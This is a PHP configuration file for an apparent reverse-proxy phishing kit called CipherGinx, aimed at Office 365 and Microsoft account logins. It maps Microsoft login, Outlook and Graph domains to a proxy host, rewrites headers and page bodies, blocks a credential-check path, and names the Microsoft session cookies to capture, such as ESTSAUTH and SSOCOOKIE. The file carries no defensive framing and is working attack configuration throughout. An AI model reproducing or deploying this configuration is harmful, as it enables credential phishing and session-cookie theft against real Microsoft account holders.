<?php
// CipherGinx PHP - Microsoft/Office 365 Phishing Configuration
// Targets Office 365 and Microsoft account login

return [
    'hostname' => 'login.microsoft.com',
    'isSSL' => true,
    'server' => 'localhost',
    'port' => 443,

    'inject_domain' => [
        ['login.microsoft.com', 'localhost'],
        ['outlook.com', 'localhost'],
        ['graph.microsoft.com', 'graph.localhost'],
    ],

    'req_headers' => [
        ['', ['Connection' => 'close']],
        ['/common/oauth2/v2.0/token', ['Origin' => 'https://localhost']],
    ],

    'resp_headers' => [
        ['', []],
    ],

    'req_body' => [],

    'resp_body' => [
        ['', 'https://login.microsoft.com', 'https://localhost'],
        ['', 'https://outlook.com', 'https://localhost'],
    ],

    'block_paths' => [
        '/common/GetCredentialType',
    ],

    'get_cookie' => [
        'ESTSAUTH',
        'ESTSAUTHPERSISTENT',
        'ESTSCOOKIE',
        'SignInStateCookie',
        'SSOCOOKIE',
        'buid',
    ],
];
